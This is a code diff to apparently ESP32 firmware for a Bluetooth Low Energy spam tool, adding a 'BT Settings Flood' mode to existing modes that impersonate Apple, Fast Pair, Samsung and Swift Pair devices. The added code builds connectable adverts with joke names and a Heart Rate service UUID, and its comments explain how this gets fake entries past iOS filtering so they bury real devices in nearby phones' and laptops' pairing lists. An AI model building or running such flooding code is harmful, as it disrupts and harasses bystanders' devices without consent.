@@ -39,8 +39,9 @@ enum SpamMode {
     MODE_SAMSUNG_WATCH,
     MODE_SWIFT_PAIR,
     MODE_FLIPPER_ZERO,
+    MODE_BT_SETTINGS_FLOOD,
     MODE_CHAOS,
-    MODE_COUNT  // 8
+    MODE_COUNT  // 9
 };
 
 static const char* MODE_NAMES[] = {
@@ -51,6 +52,7 @@ static const char* MODE_NAMES[] = {
     "SAMSUNG WATCH",
     "SWIFT PAIR",
     "FLIPPER ZERO",
+    "BT SETTINGS FLOOD",
     "CHAOS"
 };
 
@@ -202,10 +204,36 @@ static const char* FLIPPER_NAMES[FLIPPER_COUNT] = {
     "Flipper Zero"
 };
 
+// ═══════════════════════════════════════════════════════════════════════════
+// BT SETTINGS FLOOD (2026-10-06) — same idea as Momentum firmware's "BT
+// Settings Flood": plain, boring, standards-legal connectable adverts (Flags
+// + Complete Local Name only, no vendor-specific payload at all), each with a
+// goofy name. Unlike every other mode above, this one is NOT trying to hit a
+// platform-specific popup listener — Apple/Google/Microsoft's proprietary
+// Proximity Pairing / Fast Pair / Swift Pair listeners are what make those
+// modes pop up without a scan screen even being open, and the FLIPPER ZERO
+// mode above impersonates a vendor ID that has no such listener at all.
+// This mode instead targets the plain "Add a device" / Settings > Bluetooth
+// pairing list every OS has, which only lists devices advertised as
+// connectable — hence ADV_TYPE_IND (connectable+scannable undirected, the
+// type a normal discoverable peripheral uses) instead of the
+// ADV_TYPE_NONCONN_IND every other mode uses (see the adv_type switch in
+// doBroadcast()). A flood of fake discoverable devices with joke names then
+// buries any real device in that list on whatever phone/laptop is scanning.
+// ═══════════════════════════════════════════════════════════════════════════
+
+#define BT_FLOOD_COUNT 12
+
+static const char* BT_FLOOD_NAMES[BT_FLOOD_COUNT] = {
+    "Flipper", "🦈", "💀", "👻", "🤖", "💩",
+    "AirTag", "Evil Twin", "Definitely Not a Flipper",
+    "FBI Surveillance Van", "💥 Pwned", "🔥"
+};
+
 // Device counts per mode (CHAOS uses all, so 0 here — never indexed directly)
 static const int MODE_DEVICE_COUNTS[] = {
     APPLE_COUNT, SOUR_APPLE_COUNT, FAST_PAIR_COUNT, SAMSUNG_BUDS_COUNT,
-    SAMSUNG_WATCH_COUNT, SWIFT_PAIR_COUNT, FLIPPER_COUNT, 0
+    SAMSUNG_WATCH_COUNT, SWIFT_PAIR_COUNT, FLIPPER_COUNT, BT_FLOOD_COUNT, 0
 };
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -264,6 +292,7 @@ static const char* getDeviceName(int mode, int idx) {
         case MODE_SAMSUNG_WATCH: return (idx >= 0 && idx < SAMSUNG_WATCH_COUNT) ? SAMSUNG_WATCH_NAMES[idx] : "?";
         case MODE_SWIFT_PAIR:    return (idx >= 0 && idx < SWIFT_PAIR_COUNT) ? SWIFT_PAIR_NAMES[idx] : "?";
         case MODE_FLIPPER_ZERO:  return (idx >= 0 && idx < FLIPPER_COUNT) ? FLIPPER_NAMES[idx] : "?";
+        case MODE_BT_SETTINGS_FLOOD: return (idx >= 0 && idx < BT_FLOOD_COUNT) ? BT_FLOOD_NAMES[idx] : "?";
         case MODE_CHAOS:         return "CHAOS";
         default:                 return "?";
     }
@@ -474,11 +503,52 @@ static void getFlipperPayload(BLEAdvertisementData& advData, int idx) {
     advData.addData(std::string((char*)pkt, i));
 }
 
+// BT Settings Flood — deliberately boring, spec-clean advert: Flags + a
+// Complete Local Name, plus one deliberately-chosen vendor-neutral service
+// UUID — the Bluetooth SIG "adopted" Heart Rate Service (0x180D). iOS's
+// Settings > Bluetooth screen is curated for classic-Bluetooth-style
+// accessories; a bare BLE advert with just a name/flags (what v1 of this
+// mode sent) never appears there regardless of connectability or address
+// stability — that's confirmed by Apple/Silicon Labs/Nordic BLE docs, not a
+// MAC-rotation issue. BLE peripherals advertising specific adopted GATT
+// services (Heart Rate being the best-documented case — every BLE heart
+// rate strap shows up in iOS Settings this way, no app needed) get treated
+// as a recognized accessory and listed. There's no real GATT server behind
+// this (raw adv data only, same as every other mode here), so actually
+// tapping one of these fake entries to connect will just fail/time out —
+// that's fine, the point is populating the list, not completing a pairing.
+static void getBtFloodPayload(BLEAdvertisementData& advData, int idx) {
+    const char* name = BT_FLOOD_NAMES[idx % BT_FLOOD_COUNT];
+    int nameLen = (int)strlen(name);
+    if (nameLen > 22) nameLen = 22;  // Flags(3)+UUID(4)+name-hdr(2)+nameLen <= 31
+
+    uint8_t pkt[31];
+    int i = 0;
+    pkt[i++] = 0x02;  // Flags: length
+    pkt[i++] = 0x01;  // Flags: type
+    pkt[i++] = 0x06;  // LE General Discoverable + BR/EDR not supported
+
+    pkt[i++] = 0x03;  // Complete 16-bit Service UUID list: length (type + 2 bytes)
+    pkt[i++] = 0x03;  // Complete 16-bit Service UUID list: type
+    pkt[i++] = 0x0D;  // Heart Rate Service 0x180D (low)
+    pkt[i++] = 0x18;  // Heart Rate Service 0x180D (high)
+
+    pkt[i++] = (uint8_t)(nameLen + 1);  // Complete Local Name: length (type + name)
+    pkt[i++] = 0x09;  // Complete Local Name: type
+    memcpy(&pkt[i], name, nameLen);
+    i += nameLen;
+
+    advData.addData(std::string((char*)pkt, i));
+}
+
 // ═══════════════════════════════════════════════════════════════════════════
 // RAW ESP-IDF ADVERTISING PARAMS (bypasses Arduino wrapper for reliable BLE
 // spam) — ported unchanged. ADV_TYPE_NONCONN_IND = non-connectable
 // undirected (BLE spam standard). BLE_ADDR_TYPE_RANDOM = new random MAC per
 // broadcast cycle. 0x20 interval = 20ms = fastest BLE spec allows.
+// adv_type is flipped to ADV_TYPE_IND for BT_SETTINGS_FLOOD only (see
+// doBroadcast()) — every other mode wants NONCONN_IND so nothing can
+// accidentally connect back to the board mid-spam.
 // ═══════════════════════════════════════════════════════════════════════════
 
 static esp_ble_adv_params_t s_advParams = {
@@ -579,6 +649,11 @@ static void doBroadcast() {
             deviceName = FLIPPER_NAMES[broadcastIdx % FLIPPER_COUNT];
             break;
 
+        case MODE_BT_SETTINGS_FLOOD:
+            getBtFloodPayload(advData, broadcastIdx);
+            deviceName = BT_FLOOD_NAMES[broadcastIdx % BT_FLOOD_COUNT];
+            break;
+
         default:
             return;
     }
@@ -599,6 +674,13 @@ static void doBroadcast() {
 
     // Brief pause for data config to take effect
     delay(1);
+
+    // BT_SETTINGS_FLOOD needs to be connectable so it lands in the native
+    // "Add a device" / Settings > Bluetooth pairing list on phones/laptops —
+    // every other mode stays non-connectable so nothing can connect back
+    // mid-spam (see the s_advParams comment above).
+    s_advParams.adv_type = (broadcastMode == MODE_BT_SETTINGS_FLOOD)
+        ? ADV_TYPE_IND : ADV_TYPE_NONCONN_IND;
 
     // Start advertising with raw ESP-IDF params
     esp_ble_gap_start_advertising(&s_advParams);
